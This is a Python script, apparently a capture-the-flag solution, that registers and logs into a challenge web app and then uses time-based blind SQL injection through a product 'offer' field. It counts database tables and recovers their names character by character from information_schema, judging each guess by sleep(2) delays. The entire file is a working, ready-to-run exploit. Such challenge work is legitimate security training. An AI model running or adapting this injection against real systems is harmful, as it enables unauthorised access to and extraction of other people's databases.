import requests
from datetime import datetime
import string
import random

def random_string(length):
    str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    return str

base_url = 'http://cyberchallenge.disi.unitn.it:50050'

aux_username = random_string(20)
aux_password = random_string(20)

signup_body = {'username' : aux_username, 'password': aux_password, 'confirm-password': aux_password}
r = requests.post(base_url+'/register', signup_body)
print(f"Created new account: {aux_username} - {aux_password}")

login_body = {'username': aux_username, 'password': aux_password}
r = requests.post(base_url+'/login', login_body)

invalid_login = '<div class="flash-message error">'
if(invalid_login in r.text):
    print("Login Failed")
    raise Exception("Login Failed")
else:
    print("Login Successful")
    cookies = r.cookies

tables_found = False
tables = 0
while(not tables_found):
    injection= f"AND (SELECT (SELECT table_name FROM information_schema.tables \
        WHERE table_schema=database() LIMIT 1 OFFSET {tables}) like '%') AND sleep(2)"
    injection_body = {'offer': '9999999999 ' + injection}

    time_init = datetime.now()
    r = requests.post(base_url+'/product/5', injection_body, cookies=cookies)
    time_response = datetime.now()-time_init
    print(f"{tables} - {time_response.total_seconds()}")

    if(time_response.total_seconds() < 2):
        tables_found = True
        print(f"Number of Tables: {tables}")

    else:
        tables += 1

counter = 0
tables_name = []
while(counter < tables):

    length_found = False
    length = 0
    while(not length_found):
        injection= f"AND (LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() \
            limit 1 offset {counter})) = {length}) AND sleep(2)"
        injection_body = {'offer': '9999999999999 ' + injection}

        time_init = datetime.now()
        r = requests.post(base_url+'/product/5', injection_body, cookies=cookies)
        time_response = datetime.now()-time_init
        print(f"{length} - {time_response.total_seconds()}")

        if(time_response.total_seconds() > 2):
            length_found = True
            print(f"Table Name Length: {length}")

        else:
            length += 1

    name = ""

    while(length > 0):

        for char in string.printable:

            if(char == '%' or char == '_'):
                print(f"{char} - Skip Wildcard")
                continue

            current_try = name + char

            injection= f"AND (SELECT (SELECT table_name FROM information_schema.tables \
            WHERE table_schema=database() LIMIT 1 OFFSET {counter}) like BINARY '{current_try}%') AND sleep(2)"
            injection_body = {'offer': '9999999999 ' + injection}

            time_init = datetime.now()
            r = requests.post(base_url+'/product/5', injection_body, cookies=cookies)
            time_response = datetime.now()-time_init
            print(f"{char} - {time_response.total_seconds()}")

            if(time_response.total_seconds() > 2):
                name += char
                length -= 1
                print(f"Table #{counter} Current Name: {name}, Missing Characters: {length}")
                break

    print(f"Table #{counter} Complete Name: {name}")
    tables_name.append(name)
    counter += 1


print("Tables List: ")
for i, table_name in enumerate(tables_name):
    print(f"  {i} - {table_name}")

